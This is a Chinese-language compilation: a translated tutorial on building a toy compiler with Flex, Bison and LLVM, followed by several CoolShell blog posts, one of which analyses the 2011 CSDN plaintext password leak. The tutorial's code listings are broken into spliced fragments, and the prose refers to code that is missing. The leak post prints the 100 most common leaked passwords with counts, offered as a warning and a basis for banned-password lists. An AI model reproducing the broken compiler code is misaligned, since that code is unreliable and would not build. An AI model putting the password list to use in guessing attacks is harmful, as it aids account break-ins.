在我们开始下一步之前，你应该准备安装好Flex,Bison和LLVM。因为我们马上就要使用到它们。### 2.2 定义我们的语法我们语法是我们语言中最核心的部分，我们的语法使用类似标准C的语法，因为这样的语法非常熟悉，而且简单。我们语法的一个典型的例子如下：do_math(10)看起来很简单。它和C非常相似，但是它没有使用分号做语句的分隔，同时你也会注意到我们的语法中没有return语句。这就是你可以自己实现的部分。现在我们还没有任何机制来验证结果。我们将通过检查我们编译之后LLVM打印出的字节码验证我们程序的正确性。## 3、 第一步，使用Flex进行文法分析这是最简单的一步，给定语法之后，我们需要将我们的输入转换一系列内部标记token。如前所述，我们的语法具有非常基础的标记token:标示符identifier ，数字常量(整型和浮点型)，数学运算符号，括号，中括号，我们的文法定义文件称为token.l，它具有一些固定的语法。定义如下：%%%%在第一节(译者注：即%{%}中定义的部分)声明了一些特定的C代码。由于Bison不会去访问我门的yytext变量，我们使用宏”SAVE_TOKEN”来保证标示符的文本和文本长度是安全的(而不是靠标记本身来保证)。第一个token告诉我们要忽略掉那些空白字符。你会注意到我们有些一些等价性比较的标记和其他。还有一些标记还没有实现，你可以非常自由的将这些标记加到你自己的编译器中去。
现在我们在这里做的是定义这些标记和他们的符号名。符号(比如TIDENTFIER)将成为我们语法中的终结符。我们只是返回它，我们从未定义它，他们是在什么地方定义的？当然是在bison语法文件中。我们包含的parser.hpp头文件将会被bison所生成，并且里面的所有符号都将被生成，并被我们在这里使用。我们对这个token.l运行flex命令，并生成tokens.cpp文件，这个程序将会和我们的语法分析器一起编译并提供yylex()函数来识别这些标记。我们将在稍后运行这个命令，因为现在我们需要从bison那里生成头文件。## 4、第2步 使用Bison进行语法分析这是我们工作中最富有挑战性的一部分。生成一个正确的无二义的语法并不是一项简单的工作，要经过很多实践努力。庆幸的是，我们例子中的语法是简单而完整的。在我们实现我们的语法之前，我们需要详细的讲解一下我们的设计。### 4.1、设计AST(抽象语法树)语法分析的最终结果是抽象语法树AST，正如我们将看到的，Bison生成抽象语法树的最优工具；我们唯一需要做的事情就是将我们的代码插入到语法中去。文本形式字符串，例如”int x”代表了我们语言的文本形式，和这个类似，抽象语法树AST则代表了我们语言在内存中的表现形式一样(在语言在组装成而进程码之前)。正因如此，我们要在把这些插入在语法分析中的数据结构首先设计好。这个过程是非常直接的，因为我们为语法中的每个语义单元创建了一个结构。方法声明、方法调用，变量声明，引用，这些都构成了抽象语法树的节点。我们语言的抽象语法树的节点如下图：   !Our Toy Language AST   上图的C++代码如下：   node.h文件
class CodeGenContext;     class NStatement;     class NExpression;     class NVariableDeclaration;typedef std::vector<NStatement*> StatementList;     typedef std::vector<NExpression*> ExpressionList;     typedef std::vector<NVariableDeclaration*> VariableList;非常的清晰明了，我们省略了getter和setter方法，这里只列出了共有成员；这些类也不需要影藏私有数据，并省略了codeGen方法。在我们导出AST成LLVM的字节码时，就需要使用到这个方法。### 4.2、Bison介绍bison的语法定义文件同样是由这些标记构成的最复杂的部分。这并不是说技术上有多复杂，但是我也会花一些时间来讨论一下Bison的语法细节，好，现在让我们立刻来熟悉一下Bison的语法。我们将使用基于类似于BNF的语法，使用定义的好终结符和非终结符来组成我们有效的每一个语句和表达式(这些语句和表达式就代表我们之前定义的AST节点)。例如：
在上面例子中，我们定义了一个if语句(如果我们支持if语句话)，它和BNF不同之处在于，每个语法后面都跟了一系列动作(在'{‘和’}’之间的内容)。这个动作将在此条语法被识别(译者注：归约)的时候被执行。这个过程将会递归地按从叶子符号到根节点符号的次序执行，在这个过程，每一个非终结符最终会被合并为一棵大的语法树。你将会看到的’$$’符号代表着当前树的跟节点(译者注：’$$’代表本条语法规则中冒号左边的部分的语义内容)。此外’$1’代表了本条规则叶子中的第一个符号(译者注：’$1’代表了本条语法规则冒号右边的内容，$1代表冒号右边的第一个符号的语义值)。在上面的例子中，当’condition’有效时我们将会把$3 赋值给$$。这个例子可以解释如何将我们AST和语法规则关联起来。我们将在每一条规则中通常赋值一个节点到$$，最后这些规则会合并成一个大的抽象语法树。Bison的部分是我们语言最复杂的部分，你需要花一点时间去理解它。此外到此为止，你还没有看到完整的代码。下面就是完整的Bison部分的代码：   parser.y/* Define our terminal symbols (tokens). This should     match our tokens.l lex file. We also define the node type     they represent.     */     %token  TIDENTIFIER TINTEGER TDOUBLE     %token  TCEQ TCNE TCLT TCLE TCGT TCGE TEQUAL     %token  TLPAREN TRPAREN TLBRACE TRBRACE TCOMMA TDOT     %token  TPLUS TMINUS TMUL TDIV
/* Define the type of node our nonterminal symbols represent.     The types refer to the %union declaration above. Ex: when     we call an ident (defined by union type ident) we are really     calling an (NIdentifier*). It makes the compiler happy.     */     %type  ident     %type  numeric expr     %type  func_decl_args     %type  call_args     %type  program stmts block     %type  stmt var_decl func_decl     %type  comparison/* Operator precedence for mathematical operators */     %left TPLUS TMINUS     %left TMUL TDIV
%start program%%comparison : TCEQ | TCNE | TCLT | TCLE | TCGT | TCGE     | TPLUS | TMINUS | TMUL | TDIV     ;%%## 5、生成Flex和Bison代码现在我们有了Flex的token.l文件和Bison的parser.y文件。我们需要将这两个文件传递给工具，并由工具来生成c++代码文件。注意Bison同时会为Flex生成parser.hpp头文件；这样做是通过- d开关实现的，这个开关是的我们的标记声明和源文件分开，这样就是的我们可以让这些token标记被其他的程序使用。下面的命令创建parser.cpp，parser.hpp和tokens.cpp源文件。$ bison -d -o parser.cpp parser.y     $ lex -o tokens.cpp tokens.l如果上述工作都没有出错的话，我们现在位置已经完成了我们编译器工作总量的2/3。如果你现在想测试一下我们的代码，你可以编译一个简单的main.cpp程序：你可以编译这些文件：   $ g++ -o parser parser.cpp tokens.cpp main.cpp   现在你需要安装LLVM了，因为llvm::Value被node.h引用了。如果你不想这么做，只是想测试一下Flex和Bison部分，你可以注释掉node.h中codeGen()方法。
如果上述工作都完成了，你现在将有一个语法分析器，这个语法分析器将从标准输入读入，并打出在内存中代表抽象语法树跟节点的内存非零地址。## 6、组装AST和LLVM编译器的下一步很自然地是应该将AST转换成机器码。这意味着将每一个语义节点转换成等价的机器指令。LLVM将帮助我们把这步变得非常简单，因为LLVM将真实的指令抽象成类似AST的指令。这意味着我们真正要做的事就是将AST转换成抽象指令。   你可以想象这个过程是从抽象语法树的根节点开始遍历每一个树上节点并产生字节码的过程。现在就是使用我们在Node中定义的codeGen方法的时候了。例如，当我们遍历NBlock代码的时候(语义上NBlock代表一组我们语言的语句的集合)，我们将调用列表中每条语句的codeGen方法。上面步骤代码类似如下的形式：我们将实现抽象语法树上所有节点的codeGen方法，然后在向下遍历树的时候调用它，并隐式的遍历我们整个抽象语法树。在这个过程中，我们在CodeGenContext类来告诉我们生成字节码的位置。###  6.1、关于LLVM要注意的一些信息LLVM最大的一个确定就是，你很难找到LLVM的相关文档。在线手册、教程、或其他的文档都没有及时的得到相关维护，这些文档大部分都是过期的文档。除非你去深入研究，否则你很难找到关于C++ API的信息。如果你自己安装LLVM，docs   是最新的文档。
我发现最好学习LLVM的方法就是通过LLVM的例子去学习。在LLVM的压缩包的’example’目录下有很多快速生成字节码的例子。在LLVM demo site上可以将C做输入，然后生成C++ API的例子。以这些例子提供的方法，我找到了类似于int x = 5 ;的指令的生成方法。我使用这些工具实现大部分的节点。关于LLVM的问题描述到此为止，我将在下面罗列出codegen.h和codegen.cpp的源代码codegen.h的内容。using namespace llvm;class NBlock;codegen.cpp的内容。using namespace std;/* Create the top level interpreter function to call as entry */     vector<const type*> argTypes;     FunctionType *ftype = FunctionType::get(Type::VoidTy, argTypes, false);     mainFunction = Function::Create(ftype, GlobalValue::InternalLinkage, "main", module);     BasicBlock *bblock = BasicBlock::Create("entry", mainFunction, 0);
/* Push a new variable/block context */     pushBlock(bblock);     root.codeGen(*this); /* emit bytecode for the toplevel block */     ReturnInst::Create(bblock);     popBlock();/* Print the bytecode in a human-readable format     to see if our program compiled properly     */     std::cout << "Code is generated.\n";     PassManager pm;     pm.add(createPrintModulePass(&outs()));     pm.run(*module);     }/* -- Code Generation -- *//* TODO comparison */     }return NULL;     math:     return BinaryOperator::Create(instr, lhs.codeGen(context),     rhs.codeGen(context), "", context.currentBlock());     }
context.pushBlock(bblock);block.codeGen(context);     ReturnInst::Create(bblock);context.popBlock();     std::cout << "Creating function: " << id.name << endl;     return function;     }上述罗列很多的代码，然而这部份代码的含义需要你自己去探索。我在这里只会提及一下你需要注意的内容：* 我们在CodeGenContext类中使用一个语句块的栈来保存最后进入的block(因为语句都被增加到blocks中)    * 我们同样用个堆栈来保存每组语句块中的符号表   * 我们设计的语言只会知道他当前范围内的内容.要支持“全局”上下的做法，你必须向上搜索整个堆栈中每一个语句块，知道你最后发现你匹配的符号(现在我们只是简单地搜索堆栈中最顶层的符号表)。    * 在我们进入一个语句块之前，我们需要将语句块压栈，离开语句块时将语句块出栈剩下的内容都LLVM相关了，在这个主题上我并不是专家。但是迄今为止，我们已经有了编译和运行我们语言的所有代码。
## 7、编译和运行我们的语言### 7.1、编译我们的语言我们已经有了代码，现在我们怎么运行它？LLVM有着非常复杂的联接link，幸运的是，如果你是自己安装的LLVM，那么你就应该有一个llvm- config二进制程序，这个程序返回你需要的所有编译和联接选项。   我们也要同时更新我们的main.cpp的内容使之可以编译和运行我们的代码，这次我们main.cpp的内容如下：using namespace std;extern int yyparse();     extern NBlock* programBlock;CodeGenContext context;     context.generateCode(*programBlock);     context.runCode();return 0;     }现在我们需要这样来编译这些代码   $ g++ -o parser `llvm-config --libs core jit native --cxxflags --ldflags` *.cpp   你也可以编写一个Makefile来进行编译all: parserclean:     rm parser.cpp parser.hpp parser tokens.cpp
parser.cpp: parser.y     bison -d -o $@ $^parser.hpp: parser.cpptokens.cpp: tokens.l parser.hpp     lex -o $@ $^parser: parser.cpp codegen.cpp main.cpp tokens.cpp     g++ -o $@ llvm-config --libs core jit native --cxxflags --ldflags *.cpp### 7.2、运行我们的语言假设上述所有工作都圆满完成，那么现在你将有一个名为parser的二进制程序。运行它，还记得我们那个典型例子吗？让我们看看我们的编译器工作的如何。## 8、结论是不是非常的酷？我同意如果你只是从这篇文章中拷贝粘贴的话，你可能会对运行得到的结果感觉有点失望，但是这点结果可能也会激发你更大的兴趣。此外，这就是本文的意义，这不是本篇指导文章的结束，这只是一个开始。因为有了这篇文章的介绍，你可以在文法分析，语法分析和装配语言的时候附加上一些疯狂的特性，然后创造出一个你自己命名的语言。你现在已经可以编译语句块了，那么你现在应该已经有如何继续下去的基本想法。   本文完整的代码在Github这里。我一直都在避免提到这个代码，因为这个代码不是本文的重点，而仅仅是带过这部分代码。
我意识到这是一篇非常长的文章，并且这篇文章中难免会有出错的地方，如果你找到了任何问题，在你觉得有空的时候，欢迎你给我发电子邮件，我将会调整我的文章。你如果向想我们共享一些信息，你也可以在你觉得有空的时候写信给我们。# 用TCC可以干些什么？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnTiny C Compiler 是一个微型的 C 语言编译器，支持 Windows 和 Linux 平台。其项目主页是：。你可以使用这个不到100K的编译器编译你的C文件，其支持C的预处理，编译，机器码汇编和链接。编译速度也超过了gcc，而且它支持ISO C99标准，并且，tcc还包括了一些内存和数组边界的检查。其还可以编译Linux的内核。不过，TCC 最有趣的特性是可以用 UNIX 系统上常见的 #!/usr/bin/tcc 的方式来执行 ANSI C 语言写就的源程序，省略掉了在命令行上进行编译和链接的步骤，而可以直接运行 C 语言写就的源程序。这样就能做到像任何一种其它的脚本语言比如 Perl 或者是 Python 一样，显著的加快开发步调。可以像编写 Shell 脚本一样的使用 C 语言，随便想一想都觉得是一件奇妙的事情。但是 TCC 还有一些其它的特性呢！
在TCC这个超小型的C语言编译器下，我们还可以干得更多，比如这个开源项目：C in Python，项目主页是：，这个项目主要是让你可以在Python中直接使用C的源码。呵呵。Cinpy 是一个Python的库，它可以让你在Python的模块中实现C的函数。在前些天，酷壳向大家介绍过《Python调用C语言函数》——这主要是通过调用动态链接库的方式调用C的函数。而Cinpy则是直接在Python中写C语言。我们来看一个示例：（部分代码）import ctypes     import cinpy# Fibonacci in Python     def fibpy(x):     if x<=1: return 1     return fibpy(x-1)+fibpy(x-2)# ...and then just use them...     # (there _is_ a difference in the performance)     print fibpy(30)     print fibc(30)源代码这里下载：cinpy-0.10.tar.gz# 微软用新浪来当反面教材
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn微软的IE的Blog发布了这样一篇文章，以此来展示IE9是如何过滤广告和ActiveX控件的功能。其使用了“新浪”来做为反面案例，新浪并不是第一次成为反面案例了，之前就有人用新浪等网站来表明中国的网站的设计是怎么个烂法。呵呵。伟大的新浪。下面是新浪的在IE9下没有开启过滤的样子，我们要吧看到满天飞的flash，广告，还有视频……!新浪网站没有使用IE9的过滤功能新浪网站没有使用IE9的过滤功能下面是开启了过滤功能后的新浪网页（个人感觉还是那么乱，没办法底子太差了）!IE9开启了ActiveX过滤功能后的新浪网页IE9开启了ActiveX过滤功能后的新浪网页(全文完)# Eclipse 和 Vim作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前，neo和发布过如何在vim中得到你最喜爱的IDE特性，这是一篇在vim中装一些插件而让Vim拥有IDE的功能，比如代码自动提示等功能。当然，目前，可能强大最好用的IDE就是Eclipse和，而最强大的编辑器又是Vim了，可不可以让这两个东西合二为一呢。没有问题，开源社区的创造力永远不会让你低估。
在Vim中拥有Eclipse的功能，在Eclipse里有Vim的功能，那么eclim是你的选择了。 相关的中文文档。使用eclim，你可以在vim中有Eclipse的功能，也可以在Eclipse中嵌入Vim编辑器。很酷。!_images/java_editor_eclim_view.png还有一个工具是 **Vrapper** ，这个工具是在Eclipse中使用Vim，你只需要在Eclipse的工具栏上点一下那个gvim的按钮就可以了。（全文完）# CSDN明文口令泄露的启示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2011年12月21日晚，某计算机专业的大学生寝室，某同学大叫到：“兄弟们，最新的日本XX女星的AV片已经下好，大家快过来看啊，相当精彩啊~~~”，然而，这个寝室里的其它同学似乎没有听到这哥们的呼喊，于是，这哥们又叫了三次，没有人理他，因为大家都在眉飞色舞地谈论着CSDN的明文密码和用户帐号泄露的事情，并在网上查找着下载CSDN那600万的用户数据……上面这个故事是我编的，只是想描述一下昨晚的情形。其实，CSDN明文密码并不是什么稀奇的事情，我是2000年注册CSDN的吧，当时找回口令的机制就是把口令直接传回来了，这一定是明文了。去年去CSDN参加移动互联网沙龙的时候，范凯和蒋涛说过明文密码的事，不过他们说的是很早以前的事了，而且一笔带过了。1年后的今天，事情又暴了，可见，“出来混的，迟早是要还的”这句话是几近真理的。
我在以前的BLOG里就提到过CSDN的明文密码（在“如何设计用户登录功能”一文）和 帐号泄露（“如何设计自己的口令”） 的事（ **由此可见，酷壳里的很多文章里的事都应验了** ，因为我知道“出来混的，迟早是要还的”）（ **可悲吧？还是程序员的网站呢，明文口令和用户信息泄露有悖于一个程序员网站的称号** ）#### 泄露的密码分析我昨晚下载了www.csdn.net.sql文件，并分析了一下这个文件，经过各种awk, grep, sort, uniq, sed后，下面是我看到的东西：* 有近45万的用户使用 123456789 和 12345678 做口令。   * 有近40万的用户使用自己的生日做口令。   * 有近15万的用户使用自己的手机号做口令。   * 有近25万的用户使用自己的QQ号做口令。   * 设置成弱口令的用户占了590万，也就是那种就算你用MD5或是SHA散列的也能很快就被暴力破解出来的口令。   * 只有8000多个用户的口令里在8个长度以上，并有大写字母，小写字母，数字，并不在字典表里。（很好，这回泄露的还不单单只是明文用户密码和用户邮件，还有用户的手机号，生日和QQ号。挺好的）
下面，我们来看一下top 100的口令是什么？（第一列是采用这个密码个数，第二列是密码，我擦 dearbook是什么啊）简单地看了一下，top 一万的口令都很SB。比如什么woshishui, 123abc, aaa123456，01010101，haohaoxuexi，msconfig 相当的2B，还有[[email protected]](/cdn-cgi/l/email- protection#f3a3b3808084c38197)，q1w2e3r4t5，看似文艺，实际很2的口令…. （ **可悲吧？还是程序员的网站呢，自己设的口令有悖于一个程序员的称号** ）235033 123456789   212751 12345678   76346 11111111   45902 dearbook   34953 00000000   19986 123123123   17791 1234567890   15033 88888888   6995 111111111   5966 147258369   5553 987654321   5459 aaaaaaaa   5145 1111111111   5025 66666666   4435 a123456789   4096 11223344   3667 1qaz2wsx   3649 xiazhili   3610 789456123   3497 password   3281 87654321   3277 qqqqqqqq   3175 000000000   3143 qwertyuiop   3094 qq123456   3077 iloveyou   3061 31415926   2985 12344321   2886 0000000000   2826 asdfghjkl   2797 1q2w3e4r   2580 123456abc   2578 0123456789   2573 123654789   2540 12121212   2515 qazwsxedc   2396 abcd1234   2380 12341234   2348 110110110   2298 asdasdasd   2243 22222222   2166 123321123   2160 abc123456   2145 123456   2138 a12345678   2113 123456123   2106 a1234567   2100 1234qwer   1989 qwertyui   1986 123456789a   1971 aa123456   1918 asdfasdf   1891 99999999   1859 999999999   1859 123456aa   1854 123456123456   1699 520520520   1656 963852741   1652 741852963   1652 55555555   1589 33333333   1480 qwer1234   1384 asd123456   1339 77777777   1316 qweasdzxc   1285 code8925   1273 11112222   1268 ms0083jxj   1245 zzzzzzzz   1214 111222333   1206 qweqweqwe   1200 3.1415926   1183 123456qq   1148 147852369   1136 521521521   1121 asdf1234   1111 123698745   1109 1123581321   1058 asdfghjk   1054 q1w2e3r4   1038 12345678a   1003 woaini1314   991 1234abcd   988 123qweasd   975 1qazxsw2   967 woaiwojia   920 321321321   910 05962514787   894 123456987   892 kingcom5   882 zxcvbnm123   882 5845201314   853 0987654321   847 wwwwwwww   835 11111111111111111111   805 12345600   783 11235813   777 1q2w3e4r5t   772 10101010   770 123456asd
#### 老生长谈安全问题从酷壳出现开始我就在老生长谈用户安全的东西了，今天借着这个事，大家再去重温一下酷壳的文章吧：* Twitter禁用的口令。看看去吧，一个好的网站应该如何引导用户设置强口令。Apple ID也是这样，需要你输入的口令有大小写，数字，非数字和字母，等等。 **今天CSDN的这个列表应该成为各大网站“口令禁用列表”。*** 有朋友说，明文口令是巨2的一件事，是的。我可以告诉你，这个明文口令有可能存在于所有国内的网站上，比如：QQ，新浪，人人，开心，天涯……。 **对于安全问题，你要做最坏的假设，鲁迅先生说过：“不惮以最坏的恶意来推测中国人”，所以，对于中国的网站你要做如下最坏假设：1）其以明文存我的口令，2）其内部不良员工会把我的信息泄露出去** 。不信你可以看看下面的某QQ群里的截图：（看看多玩网明文口令的消息吧，再看看这个消息吧 QQ邮箱和QQ号的）* 你可能会说用MD5和SHA散列口令就好了，这个只比明文好一点点，因为有rainbow table，国外的号称达到99%覆盖，国内的达到93%覆盖。你加salt也没有用。就算我只能拿得到你的被散列的密码，没有rainbow和salt，我一样可以使用暴力破解，甚至就是尝试一下字典里的密码就可以了。这会非常快的，你可以看看本站的这篇文章“破解你的口令”， **现在暴力破解MD5和SHA的口令很快的，因为MD5和SHA性能太好了。** 所以，你需要看看“如何防范密码被破解”，其会告诉你加密口令要用一个性能差的算法——bcrypt。（也可以参看Web开发中需要了解的东西中的如何安全保存口令一文）
* 所以，你有必要地读一读我的这篇“如何管理和设计自己的口令”，不要在同一网站上使用相同的口令，把口令的级别分好的组。自己管理好自己的口令。* 对于Web用户的安全问题，程序员们一定要看一下 这两篇文章，你要是不看的话，你没有资格开发Web项目。     * 如何设计用户登录功能     * Web开发中需要了解的东西* 当你看过 如何设计用户登录功能 一文后，你一定会头晕的，所以，我想告诉你， **这种事情最好不要自己干，使用OpenID 和 OAuth吧，人家把这事干到了极致了** 。而且这样会带来两个好处：     * **用户不需要自己维护和管理一套新的帐号** 。     * **用户的资料放在国外，从政治上来说是安全的** 。（八卦一下：Google总部要求中国谷歌所有开发团队不得在本地保存用户的信息）* 再说一点，再说说如何让自己内部的用户数据不会被不良员工外泄。 **所有的开发团队都不允许直接操作用户的数据库，只允许通过安全的接口来验证用户，用户信息的数据库中需要对操作者有审计功能，永远不允许不受信的人或操作进行全库扫描** 。当然，我相信，国内的开发团队绝对达不到这一步（包括某些银行）。
* 再说一下， **真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞 。**比如：通过很多方法“耦合”和银行和电信其是别的第三方的安全策略，比如，让用户绑定邮箱，绑定手机，绑定信用卡等。最后说一下，CSDN在这次事件的表现看上去还是很不错的，道歉也很诚恳， **但是，我还是希望CSDN反思一下为什么数据库会泄露了？内部有不良员工？还是系统不安全被黑？不要只是诚恳道歉，还要找自己的原因。其它的网站可能就很恶劣了。包括新浪，人人，开心等，最恶心的就是腾讯，你说他的安全有问题，他还找一堆人来骂你。****祝大家新年快乐！**（全文完）# 为什么中国的网页设计那么烂？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnNick Johnson，一个有12年经验的Web设计师在它的blog里写下了“Why is Chinese Web Design So Bad”，新浪，人人，百度，阿里巴巴，腾讯榜上有名。 **其中的观点相当的好，希望所有的中国人都读一下。** 我不全文翻译了，只是给大家看一些摘要。（保证不会像《环球时报》一样）
——————————作者2005年的夏天来到中国，他说，他注意到了中国那复杂的文化和西方的有多么的不同。比如，语言，身体特征，政府的执政理念，等等，但是，有一些地方确是差别很少的，比如：幽默的sense，还有对艺术的表现形式的兴趣。很快，因为职业，他发现在中国的网站设计上完全没有引吸到他。于是他开始让身边的中国朋友尽可能多的给他推荐中国的网站，他觉得这个可以对他学习Web Design有帮助。当他在评论起新浪，人人，百度，阿里巴巴，腾讯的时候，他说，百度和其它的不同，因为百度悍然地公开抄袭Google的Web Design（blatantly copied their design from Google），而人人则是很明显地抄袭facebook（clearly copied their design from Facebook）。而其它的多数的中国网站看上去有很多很多滑稽可笑的文本，一些网站在滥用图片，一些网站图片又不够。他感到很困扰，这样的网站都能被接受？这么多的东西，网民怎么可能看得过来啊？中国人怎么可能容忍这些。（注：他不知道我们中国人能承受的比这更多）他说，更夸张的是，中国的网站上会有很多的动画，弹窗，幻灯片，感觉中国的设计师不是在设计，是在实践，还是实践那些很坏的设计理念，而些东西都是西方的设计师努力努力避免的。作者感到回到了1995年。
作者说，作为一个傲慢自大的西方人，他的第一反应是——“哦，这是一个发展中国家，简单来说，还不能赶上我们”，当然，这有可能，因为Web Design和艺术表现也有个发展过程的，当 **前的中国也许正处于“结构设计”时期** 。作者个人认为的另一个可能是，中国的Web设计者们培养环境的问题—— **中国的教育培养是说教和影响的方式，而不是持续的自然的艺术的进化** 。艺术进化的根是文化培养，但是更应该是自然的，自由地进化。作者在说他为什么这么认为的原因时，提到了他花了些时间去了下中国的大学看看这些大学在教什么。他发现， **中国的学生只是去记忆东西而不是真正的理解** 。 **他们从来不花时间去思考，而只是贪婪地去获取更多的信息** 。这和西方的教育完全的不同。（注：在这种教育体系下产生了像人人同抄袭和像新浪一样的满是信息的网页）作者继续说，在西方，他们一般用的都是“启发式”的东西，需要给人一种“啊，这样啊”的瞬间，这叫交互。而中国则不是，他们是先展示数据。中国的网站基本上是数据查询网站，就像把把信息注入到大脑中一样，没有过多的交互。另一个中国的文化是——这个民族真是很不直接，不像美国，在中国如果有人一针见血的表达观点是很不舒服的事。和中国人谈话需要拐很多弯。然而，对于西方人来说，模糊的表达才是让人很不舒服的。但是中国人都很接受这样的沟通方式。这也是中国网页设计成这个样子的一个原因。
——————————————我觉得作者的话说的很中肯。然而，作者的这篇博文后面很多回复，你都可以去看看。那些回复中，我看到的是那些“不服输”的中国人（这是不是我们从小那种“争第一”的教育培养出来人呢？）。看完以后，我觉得让我思考的已经不是网页设计了，而是我们的教育和文化。**你呢？是在反思呢，还是准备去作者的 blog上debate呢？**# 再谈敏捷和ThoughtWorks中国咨询师作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn目录* 前言说明   * 基本观点   * 对于敏捷方法论的观点   * 对于ThoughtWorks咨询师的批评观点   * 关于ThoughtWorks和InfoQ给我的信#### 前言说明之所以用了“再”，是因为之前的两篇文章——* 我在《那些炒作过度的技术和概念》中批评了ThoughtWorks中国咨询师的咨询方法是以一种接近于教条、炒作、洗脑和电视购物的方法（虽然我心底觉得有时候有时候更像传销），当然，批评是没有意义的，所以我也给了中国ThoughtWorks那些年轻的咨询师们一些我认为有建设性的建议。
* 我在《TDD并不是看上去的那么美》一文中列举了一些在实际中使用TDD可能会出现的问题和难题，以此来告诉大家在使用TDD时需要注意的东西。就像是在《结对编程的利与弊》说的一样，只有真正知道一件事情的利弊，你才能用好它。当然，这两篇文章都不可避免得招来了ThoughtWorks咨询师和Agile信仰者们的很多回复，我也有开始沉不住气回复了很多，当然，有一半以上的不是学术上的讨论，而是对我个人的攻击。甚至，在这两篇文章发布后，酷壳（CoolShell.cn）受到持续性的黑客攻击。本来已经过去的事，今天却又发现这两篇文章的访问量和评论又上来了，才发现原来是InfoQ的这篇文章——《虚拟座谈会：TDD有多美？》，加上很多我在评论中的观点，以及ThoughtWorks和InfoQ之前给我的来信中谈到的一些观点。我很不自然地想把我的一些观点总结并罗列在这里。主要分成四块—— 1） **我对整个事情的基本观点** ，2） **对于方法论的观点，3）对于TW中国咨询师的观点** ，4） **还有和TW和InfoQ住来信件中的观点** **。****————————————————**#### 基本观点
首先，我想说明一下我的基本观点。一、 **真金不怕火炼** 。我就像大家一样，平时总是会或多或少的埋怨点什么。大街上有人随便做个事，你会和他较真吗？不会。这个事也一样，我就像大家茶余饭后批评房价和物价一样，你们没有必要那么较真，不值得这样小题大作（除非你们真的心虚了），如果你做得好的话，真金不怕火炼，我这点批评算得了什么。 **你们玩的是“敏捷”不是“敏感”** 。二、 **从正反面思考** 。我和大家一样，喜欢思考，喜欢从正面和反面一同思考问题，我有质疑的癖好，我希望大家都有这样的思考方式。注意， **质疑的结果不是为了质疑而质疑，而是去寻找完整认识的一种方法** 。三、 **观点的自由** 。我不是一棍大打死一片的人，我不完全否定敏捷（我的那两篇文章都有一再说明过了），同时我也不会完全同意敏捷。我不会因为敏捷有不好的地方我一棍子打死，我同样不会因为敏捷的好处就大唱赞歌。任何事物都有好有坏，我寻求的是自由地发表我的观点。 **我反对观点的极端，但我追求观点的自由** 。**四、观点的不同。** 观点只有不同才会让人思路完整，观点只有不同才会迸发出火花，世界的进展正是因为有不同的观点。如果敏捷的咨询师和信仰者们不接受不同观点，不接受批评，那么你们将无法进步和发展，如果你们妄图让所有人都持认可敏捷的和谐观点，那么你们将会变得邪恶。 **没有批评，赞美也会变得没有意义** 。
**————————————————**#### 对于敏捷方法论的观点一、 **没有好的方法，只有适不适合的方法** 。正如没有好的设计，只有适不适合的设计一样。喜欢足球的朋友都知道，世界级的足球队中，巴西队玩的是个人艺术足球，德国队玩的是整体和纪律性足球，意大利玩的是防守型足球，但是他们都有夺世界杯冠军的实力，如果你硬要让巴西队去整意大利的风格，或是让德国整巴西的风格，那就悲剧了。 **敏捷是不会是适合所有人所有项目的，就像不是所有的人都有运动的天赋一样** 。二、 **软件开发的中心是人和项目，而不是方法** 。千万不要把方法放在中心，改变项目的性质和人的习惯去适应这个方法。正确的方法是，以人和项目为中心，了解项目中所有人的想法和做事的风格，以及项目的性质，从而决定采用什么样的方法。大家可以看看InfoQ上那几个“专家”关于TDD的对话，除了Google的测试经理外，其它人从到到尾谈的都是TDD方法，谈的都是如果要TDD，人应该怎么怎么样。 **这就是敏捷最大的问题——教条主义横行，以方法论为中心横行** 。我批判的就是这个！三、 **好的方法不是讲出来的，而是在实践中改善出来的** 。好的方法不用去讲出来的，而是从团队内部自发出来的。如果敏捷方法论很不错的话，那么应该会在现实中体现出来。 **真正好的方法是团队内部根据自身情况在不同的项目上使用的不同的方法** 。（注：请不要使用XUnit, Spring，ANT等程序框架举例，因为那些项目的用户是程序员）
四， **方法论不是一种理论** 。敏捷的鼓吹者说，TDD让你更关注设计，TDD更能了解需求。理论上，你可以把TDD拔到这样的高度，甚至更高的高度。可是具体实践上呢，你会发现在有压力的状态下你的程序员关注得更多的是测试过不过，在和用户沟通的时候，你会发现，根本没有一种好的方法论可以把需求完全搞清。如果TDD可以完全搞清需求，还要迭代干什么，直接waterfall了（其它关于TDD的观点请看我的文章《TDD并不是看上去的那么美》）理论和实际的差别的很大的。**————————————————**#### **对于ThoughtWorks咨询师的批评观点**对于 下面这些言论，我就不一一点名了，因为我觉得这和咨询师没有关系，这和TW中国公司的管理理念有关系。* 中国ThoughtWorks某些咨询师通常在加入公司很短的时间内（1-2年），基本上都以被冠以“高级咨询师”。1-2年能做几个项目？我以为能给人做咨询的人都是在技能上让人佩服的那种人。20出头还是埋头苦干，努力学习，积累经验的时候，经验都不够，就可以给人咨询。* 中国ThoughtWorks某些咨询师们，喜欢翻译国外的书，但从不自己写书，他们喜欢blog，他们的blog里都里大量的Agile的方法，而很少有对技术的见解，以及技术细节知识性的文章，在他们的blog中，你很难看见代码。
